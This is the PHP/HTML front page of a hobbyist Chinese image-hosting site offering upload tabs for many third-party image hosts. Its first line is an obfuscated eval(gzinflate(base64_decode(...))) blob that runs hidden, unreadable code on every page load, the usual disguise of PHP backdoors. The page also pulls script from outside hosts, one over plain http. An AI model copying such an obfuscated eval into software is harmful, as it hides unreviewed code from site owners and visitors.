<?php eval(gzinflate(base64_decode("\x62\x59\x35\116\141\64\x4e\101\106\105\x58\63\147\x76\x39\150\105\107\x47\125\147\x49\107\x53\116\x36\105\x6b\x5a\x74\x56\x53\147\164\x4e\62\156\132\x52\123\x78\166\x47\x70\x6a\66\x67\172\146\x68\121\161\x4a\x66\x2b\x39\x57\x74\x74\144\126\156\144\170\x7a\162\x33\x76\115\144\145\x68\122\x6c\145\146\x47\124\113\165\x54\126\x32\142\x5a\161\62\x4e\x48\x54\163\x71\x79\151\x47\x79\160\145\127\x37\127\60\x4b\124\x55\x2f\106\x50\x66\x66\x6f\151\x5a\x65\112\x55\x39\x53\x67\x32\110\170\154\x71\153\x32\110\x67\114\x38\x34\x62\124\61\x76\x2b\x48\x73\64\142\x4f\x51\x76\70\126\104\x56\x78\166\x50\x67\x68\x2b\x33\x61\x64\113\61\x59\71\x54\165\x6e\142\107\x78\x4d\x63\116\x76\x55\122\67\116\60\x44\x70\x44\x69\113\112\x4f\x6e\x67\x52\111\125\x34\61\x35\x66\x74\144\x6e\x77\x57\x78\71\x64\x37\x6b\x50\x54\171\155\171\x65\x61\x32\112\x4d\123\143\x6e\x55\107\117\130\145\x77\x45\x4d\154\161\101\107\147\146\121\142\x5a\x79\70\156\115\x2b\57\64\103\66\x4e\115\x7a\142\71\67\157\152\117\x78\x78\x55\150\x64\x30\121\143\103\71\x61\x72\x6b\143\145\104\x2f\x66\x72\x50\53\142\x74\x72\161\x37\172\101\x77\75\x3d")));?>
<!--
小猫咪图床
    BY：云猫  
    QQ：3522934828
    目前对接了三楼，芥子，本地，以及小猫咪图床～
    接口能实时更新，没那么容易凉，即便全部凉了，还有一个本地呢～对吧
    前台模板随便找的，不喜欢不要喷(*'ε`*)然后随便凑起来的，不用数据库
    后台有点小丑，别骂(⋟﹏⋞)
    有木有bug没钱还不知道耶(*'へ'*)
    源码:https://ximami.lanzoui.com/b001ig23g
    这程序以后更新都会在上面那个蓝奏云里面
    学生党一枚，聊天注意点哦～
    2021.6.4
-->
<?php if($config['web']==0){echo "<script>alert('网站正在维护哦～');window.location.href='404.html';</script>";}?>
<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title><?php echo $config['title'];?></title>
    <meta name="keywords" content="<?php echo $config['keywordsl'];?>">
    <meta name="description" content="<?php echo $config['description'];?>">
    <link href="https://ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/img/style2.css" rel="stylesheet" type="text/css">
    <link href="gj.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="https://ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/404/bg.css" type="text/css" />
    <script type="text/javascript" src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js"></script>	
	<script type="text/javascript" src="https://ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/img/img.js"></script>
	<script src="https://cdn.bootcdn.net/ajax/libs/layui/2.5.6/layui.all.js"></script>
	<script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" type="text/javascript"></script>
    <script src="//cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="//cdn.bootcss.com/layer/2.3/layer.js" type="text/javascript"></script>
    <script type="text/javascript" src="https://ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/img/jquery.form.min.js"></script>
 </head>
<body>

<!--悬浮动漫挂件，不需要就删了这下面那几段代码-->
<script type="text/javascript">
var isindex = true;
var visitor = true;
</script>
<div id="spp" class="spp">
    <div id="message">正在加载中……</div>
    <div id="mumu" class="mumu"></div>
</div>
<!--悬浮动漫挂件，不需要就删了这下面那段代码-->

<!--天气，不需要就删了这下面那段代码-->
<div id="tp-weather-widget" style="position:absolute;z-index:99999;"></div>
<!--天气-->

<div class="container" style="padding-top:20px;">
    <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
        <div class="panel panel-default card-view">
            <div class="row heading-bg bg-green text-center">
                <h5 class="txt-light"><?php echo $config['title'];?></h5>
            </div>
            <div class="item">
                <div class="testimonial-wrap text-center pl-20 pr-20">
                    <p style="color:#F15B26;font-size: 16px"><?php echo $config['gg'];?></p><br/>
                    <a class="btn btn-success btn-xs" target="_blank" href="<?php echo $config['xiao11'];?>"><?php echo $config['xiao1'];?></a>
                    <a class="btn btn-info btn-xs" target="_blank" href="<?php echo $config['xiao22'];?>"><?php echo $config['xiao2'];?></a>
                    <a class="btn btn-warning btn-xs" target="_blank" href="<?php echo $config['xiao33'];?>"><?php echo $config['xiao3'];?></a>
                </div>
            </div>
            <hr>            
            <div class="tab-struct custom-tab">
                <ul role="tablist" class="nav nav-tabs" id="myTabs_15">
                <?php
                    if ($config['hlx']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#hlx">三楼图床</a></li>';}
                    ?>
                    <?php
                    if ($config['jz']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#jz">芥子图床</a></li>';}
                    ?>
                    <?php
                    if ($config['bilibili']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#bilibili">b站图床</a></li>';}
                    ?>
                    <?php
                    if ($config['qq']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#qq">QQ图床</a></li>';}
                    ?>
                    <?php
                    if ($config['sh']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#sh">搜狐图床</a></li>';}
                    ?>
                    <?php
                    if ($config['bd']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#bd">百度图床</a></li>';}
                    ?>
                    <?php
                    if ($config['jd']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#jd">京东图床</a></li>';}
                    ?>
                    <?php
                    if ($config['58']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#58">58图床</a></li>';}
                    ?>
                    <?php
                    if ($config['tt']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#tt">头条图床</a></li>';}
                    ?>                  
                    <?php
                    if ($config['bj']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#bj">笔迹图床</a></li>';}
                    ?>
                    <?php
                    if ($config['local']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#localhost">本地图床</a></li>';}
                    ?>
                    <?php
                    if ($config['xiaogf']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#api">小猫咪图床</a></li>';}
                    ?>
                    <?php
                    if ($config['sougou']==0) {
                    }else{echo '<li role="presentation"><a data-toggle="tab" href="#sougou">搜狗图床</a></li>';}
                    ?>
                </ul>
                <div class="tab-content">
                <div id="hlx" class="tab-pane fade active in">
                        <blockquote>
                            <a>葫芦侠图床，速度挺好，但是压缩严重</a>
                        </blockquote>                        
                      <form id="file" action="api.php?type=hlx" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="hlxle" style="display: none;"><input id="hlxjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="hlxa btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
                    
                <div id="localhost" class="tab-pane fade">
     <div class="tab-content">                                             
                        <blockquote>
                        <a>本地图床，图片无压缩，速度取决于服务器速度</a>
                        </blockquote>
                        <form id="file" action="api.php?type=localhost" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="localle" style="display: none;"><input id="localjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="locala btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div> 
                        <div id="jz" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>芥子图床，速度还行，压缩没三楼严重</a>
                        </blockquote>
                        <form id="file" action="api.php?type=jz" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="jzle" style="display: none;"><input id="jzjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="jza btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>                           
                    
                    
                    <div id="api" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>小猫咪图床，图片无压缩，原图，速度不算慢～</a>
                        </blockquote>
                        <form id="file" action="api.php?type=api" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="apile" style="display: none;"><input id="apijk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="apia btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>                    
                    
                    
                    
                    <div id="sougou" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>搜狗图床，速度不错，就是压缩严重，经上版本测试，很容易被删图片，不建议使用～</a>
                        </blockquote>
                        <form id="file" action="api.php?type=sougou" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="sgle" style="display: none;"><input id="sgjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="sga btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
                    <div id="bilibili" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>bilibili图床，速度不错，稳定性不错</a>
                        </blockquote>
                        <form id="file" action="api.php?type=bz" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="bzle" style="display: none;"><input id="bzjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="bza btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
                          <div id="bj" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>小猫咪图床，图片无压缩，原图，速度不算慢～</a>
                        </blockquote>
                        <form id="file" action="api.php?type=bj" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="bjle" style="display: none;"><input id="bjjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="bja btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
      
      <div id="qq" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>QQ图床，速度快，压缩一般，稳定性未知</a>
                        </blockquote>
                        <form id="file" action="api.php?type=qq" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="qqle" style="display: none;"><input id="qqjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="qqa btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
      
      <div id="sh" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>搜狐图床</a>
                        </blockquote>
                        <form id="file" action="api.php?type=sh" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="shle" style="display: none;"><input id="shjkpijk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="sha btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
      
      <div id="bd" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>百度论坛图床，还挺好用</a>
                        </blockquote>
                        <form id="file" action="api.php?type=bd" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="bdle" style="display: none;"><input id="bdjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="bda btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
      
      <div id="58" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>58图床</a>
                        </blockquote>
                        <form id="file" action="api.php?type=58" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="58le" style="display: none;"><input id="58jk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="58a btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
      
      <div id="jd" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>京东图床</a>
                        </blockquote>
                        <form id="file" action="api.php?type=jd" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="jdle" style="display: none;"><input id="jdjk" type="submit" name="submit" value="提交" style="display: none;">
		<div class="jda btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
      
      <div id="tt" class="tab-pane fade">
 	                  <div class="tab-content">                                             
                        <blockquote>
                        <a>头条图床</a>
                        </blockquote>
                        <form id="file" action="api.php?type=tt" method="post" enctype="multipart/form-data">
		<label for="file"></label><input type="file" name="file" id="ttle" style="display: none;"><input id="ttle" type="submit" name="submit" value="提交" style="display: none;">
		<div class="tta btn btn-success">
      		<div class="bk">
      		点击这里选择上传图片～
        	</div>
      	</div>
       </form>
      </div>
      </div>
      
                     <div class="panel panel-default card-view">
            <center><p><?php echo $config['foot'];?></p></center>           
            <center><p><font color="black"><script type="text/javascript" src="http://api.lq520.club/api/yy2.php?format=js&charset=utf-8"></script><script>misaka()</script></font></p></center>
        </div>
    </div>
</div>
<div id="audio"class="music">
<img src="https://cdn.u1.huluxia.com/g4/M03/A4/00/rBAAdmFG-FKAL59LAANX1RrK8OU597.gif" width="60px" height="60px" id="d" onclick="c();">
</div>
<audio id="bgmMusic" src="<?php echo $config['music'];?>" autoplay="autoplay" loop="loop" preload="auto" type="audio/mp3"></audio>
  	<script>
		$(document).ready(function() {			
    		$(".hlxa").click(function(){
        		$("#hlxle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#hlxle").change(function(){
            	$("#hlxjk").click();
            });          	
            $(".jza").click(function(){
        		$("#jzle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#jzle").change(function(){
            	$("#jzjk").click();
            });
            $(".bja").click(function(){
        		$("#bjle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#bjle").change(function(){
            	$("#bjjk").click();
            });
            $(".bza").click(function(){
        		$("#bzle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#bzle").change(function(){
            	$("#bzjk").click();
            });
            $(".bda").click(function(){
        		$("#bdle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#bdle").change(function(){
            	$("#bdjk").click();
            });
            $(".qqa").click(function(){
        		$("#qqle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#qqle").change(function(){
            	$("#qqjk").click();
            });
            $(".58a").click(function(){
        		$("#58le").click();
          		layer.load(0, {shade: false})
        	});
       		$("#58le").change(function(){
            	$("#58jk").click();
            });
            $(".tta").click(function(){
        		$("#ttle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#ttle").change(function(){
            	$("#ttjk").click();
            });
            $(".sha").click(function(){
        		$("#shle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#shle").change(function(){
            	$("#shjk").click();
            });
            $(".jda").click(function(){
        		$("#jdle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#jdle").change(function(){
            	$("#jdjk").click();
            });
            $(".sga").click(function(){
        		$("#sgle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#sgle").change(function(){
            	$("#sgjk").click();
            });
            $(".apia").click(function(){
        		$("#apile").click();
          		layer.load(0, {shade: false})
        	});
       		$("#apile").change(function(){
            	$("#apijk").click();
            });
            $(".locala").click(function(){
        		$("#localle").click();
          		layer.load(0, {shade: false})
        	});
       		$("#localle").change(function(){
            	$("#localjk").click();
            });
          
	 	});
	</script>
</body>
</html>